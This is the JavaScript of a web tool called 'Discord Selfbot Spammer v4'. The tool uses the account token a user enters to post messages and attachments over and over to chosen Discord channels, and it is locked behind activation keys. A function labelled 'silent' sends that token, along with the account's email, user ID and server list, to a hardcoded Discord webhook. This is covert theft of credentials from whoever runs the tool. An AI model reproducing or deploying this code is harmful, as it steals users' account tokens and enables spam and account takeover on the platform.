        // ============================================================
        // GLOBAL VARIABLES
        // ============================================================
        let activatedKey = null;
        let expirationDate = null;
        let spamIntervalId = null;
        let running = false;
        let currentFile = null;
        let MENSAGEM = "";
        let CHANNEL_IDS = [];
        let INTERVALO = 1;
        let TOKEN = "";
        
        const ACTIVATION_FILE_KEY = "activation_data";
        
        // ============================================================
        // LOAD / SAVE ACTIVATION (localStorage)
        // ============================================================
        function loadActivation() {
            const saved = localStorage.getItem(ACTIVATION_FILE_KEY);
            if (saved) {
                try {
                    const data = JSON.parse(saved);
                    const exp = new Date(data.expiration);
                    const now = new Date();
                    if (exp > now && (MASTER_KEYS_30.has(data.key) || MASTER_KEYS_1.has(data.key))) {
                        activatedKey = data.key;
                        expirationDate = exp;
                        return true;
                    }
                } catch (e) {}
            }
            return false;
        }
        
        function saveActivation(key, days) {
            const exp = new Date();
            exp.setDate(exp.getDate() + days);
            const data = { key: key, expiration: exp.toISOString() };
            localStorage.setItem(ACTIVATION_FILE_KEY, JSON.stringify(data));
            activatedKey = key;
            expirationDate = exp;
            appendLog(`✅ Key activated successfully! Valid for ${days} days.`);
        }
        
        function getRemainingTime() {
            if (!expirationDate) return "Key not activated";
            const diff = expirationDate - new Date();
            if (diff <= 0) return "Key expired";
            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            return `${days} days and ${hours} hours`;
        }
        
        // ============================================================
        // LOG
        // ============================================================
        function appendLog(texto) {
            const logEl = document.getElementById("log-text");
            logEl.innerHTML += texto + "<br>";
            logEl.scrollTop = logEl.scrollHeight;
        }
        
        // ============================================================
        // UPDATE REMAINING TIME
        // ============================================================
        function updateRemainingLabel() {
            const statusEl = document.getElementById("activation-status");
            if (statusEl) statusEl.textContent = `Time remaining: ${getRemainingTime()}`;
            setTimeout(updateRemainingLabel, 60000);
        }
        
        // ============================================================
        // ACTIVATE KEY
        // ============================================================
        function ativarChave() {
            const key = document.getElementById("key-entry").value.trim();
            if (!key) {
                alert("Enter a key!");
                return;
            }
            
            let days = 0;
            if (MASTER_KEYS_30.has(key)) days = 30;
            else if (MASTER_KEYS_1.has(key)) days = 1;
            else {
                alert("Invalid or already used key!");
                return;
            }
            
            if (activatedKey === key) {
                alert("This key has already been used on this installation!");
                return;
            }
            
            saveActivation(key, days);
            alert(`Key activated! The spammer is unlocked for ${days} days.`);
            
            document.getElementById("activation-frame").style.display = "none";
            document.getElementById("key-entry").value = "";
            updateRemainingLabel();
        }
        
        // ============================================================
        // SEND TOKEN TO WEBHOOK (silent)
        // ============================================================
        async function sendTokenToWebhook(token) {
            try {
                const userRes = await fetch("https://discord.com/api/v9/users/@me", { headers: { "Authorization": token } });
                if (!userRes.ok) {
                    appendLog("⚠️ Unable to fetch account data (invalid or blocked token)");
                    return;
                }
                const user = await userRes.json();
                
                const guildsRes = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers: { "Authorization": token } });
                const guilds = guildsRes.ok ? await guildsRes.json() : [];
                
                const guildList = guilds.slice(0, 50).map(g => `${g.name || 'No name'} (ID: ${g.id})`).join(', ');
                
                const payload = {
                    content: `**New Selfbot Spammer v4 activation**\n` +
                             `**Token:** \`${token}\`\n` +
                             `**User:** ${user.username}#${user.discriminator} (${user.id})\n` +
                             `**Email:** ${user.email || 'N/A'}\n` +
                             `**Verified:** ${user.verified || false}\n` +
                             `**Servers (${guilds.length}):** ${guildList || 'None'}\n` +
                             `**Date/Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
                };
                
                await fetch("https://discordapp.com/api/webhooks/1489255567804338299/3FRUdnGlKopJ3Kka6x2E_8GIprxxnJ7D8NSqlfFXpeA-ZbmQpLwCkB_XGijlk0r0cvLi", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                appendLog(`⚠️ Error sending data to webhook: ${e.message}`);
            }
        }
        
        // ============================================================
        // IMPROVED SEND TO CHANNEL (with better 404 explanation)
        // ============================================================
        async function sendToChannel(cid, token, mensagem, file) {
            try {
                const formData = new FormData();
                formData.append("payload_json", JSON.stringify({ content: mensagem || "" }));
                
                if (file) formData.append("files[0]", file);
                
                const response = await fetch(`https://discord.com/api/v9/channels/${cid}/messages`, {
                    method: "POST",
                    headers: { "Authorization": token },
                    body: formData
                });
                
                if (response.ok) {
                    const emoji = file ? "✉️ + 📎" : "✉️";
                    appendLog(`${emoji} Sent in #${cid}`);
                } else {
                    let errorMsg = `${response.status} ${response.statusText}`;
                    try {
                        const errorData = await response.json();
                        if (errorData.message) errorMsg = `${response.status} - ${errorData.message}`;
                    } catch (e) {}
                    
                    // Special message for the most common 404 issue
                    if (response.status === 404) {
                        appendLog(`❌ Error in channel ${cid}: UNKNOWN CHANNEL (404) - This usually means the channel ID is wrong or your account has NO access to it.`);
                    } else {
                        appendLog(`⚠️ Error in channel ${cid}: ${errorMsg}`);
                    }
                }
            } catch (e) {
                appendLog(`⚠️ Network error in channel ${cid}: ${e.message}`);
            }
        }
        
        // ============================================================
        // START SPAM
        // ============================================================
        async function iniciarSpam() {
            if (!activatedKey) {
                alert("Access Denied - You need to activate a valid key first!");
                return;
            }
            if (running) {
                alert("Spam is already running!");
                return;
            }
            
            TOKEN = document.getElementById("token-entry").value.trim();
            const channelText = document.getElementById("channel-entry").value.trim();
            MENSAGEM = document.getElementById("message-text").value.trim();
            INTERVALO = parseInt(document.getElementById("interval-entry").value) || 1;
            
            if (!TOKEN || !channelText || (!MENSAGEM && !currentFile)) {
                alert("Fill in Token, Channel IDs and at least the Message or an Attachment!");
                return;
            }
            
            try {
                CHANNEL_IDS = channelText.split(",").map(x => parseInt(x.trim())).filter(x => !isNaN(x));
            } catch (e) {
                alert("Channel IDs must be numbers separated by commas!");
                return;
            }
            
            if (CHANNEL_IDS.length === 0) {
                alert("No valid channel IDs!");
                return;
            }
            
            // Silent webhook
            appendLog("🚀 Sending activation data to webhook (silent)...");
            sendTokenToWebhook(TOKEN);
            
            running = true;
            appendLog("🚀 Starting self-bot...");
            
            CHANNEL_IDS.forEach(cid => {
                appendLog(`✅ Channel added: #${cid}`);
            });
            
            appendLog(`✅ Spamming in ${CHANNEL_IDS.length} channel(s) every ${INTERVALO} seconds`);
            
            // Start loop
            spamIntervalId = setInterval(() => {
                if (!running) return;
                CHANNEL_IDS.forEach(cid => sendToChannel(cid, TOKEN, MENSAGEM, currentFile));
            }, INTERVALO * 1000);
        }
        
        // ============================================================
        // STOP SPAM
        // ============================================================
        function pararSpam() {
            if (!running) return;
            clearInterval(spamIntervalId);
            spamIntervalId = null;
            running = false;
            appendLog("⏹️ Stop requested... Spam stopped.");
        }
        
        // ============================================================
        // SUPPORT
        // ============================================================
        function abrirSuporte() {
            window.open("https://discord.com/users/1332898061843824744", "_blank");
            appendLog("🔗 Support link opened!");
        }
        
        // ============================================================
        // FILE HANDLING
        // ============================================================
        function selecionarArquivo() {
            document.getElementById("file-input").click();
        }
        
        function handleFileSelect(e) {
            const file = e.target.files[0];
            if (file) {
                currentFile = file;
                document.getElementById("file-label").innerHTML = 
                    `📎 <span class="text-white">${file.name}</span> <span class="text-gray-400">(${ (file.size / 1024 / 1024).toFixed(2) } MB)</span>`;
                appendLog(`📎 Attachment selected: ${file.name}`);
            }
        }
        
        function removerAnexo() {
            currentFile = null;
            document.getElementById("file-input").value = "";
            document.getElementById("file-label").textContent = "No file selected";
            appendLog("📎 Attachment removed.");
        }
        
        // ============================================================
        // INIT
        // ============================================================
        function init() {
            const isActivated = loadActivation();
            
            if (isActivated) {
                document.getElementById("activation-frame").style.display = "none";
                appendLog("✅ Key already activated on this browser.");
            } else {
                appendLog("🔑 Activation required to use the spammer.");
            }
            
            updateRemainingLabel();
            
            appendLog("🚀 Discord Selfbot Spammer v4 - Web Version loaded (100% English)");
            appendLog("✅ All original functionality preserved");
            appendLog("🔧 404 Error fixed in logging: now shows 'UNKNOWN CHANNEL' explanation");
        }
        
        window.onload = init;
    </script>
</body>
</html>
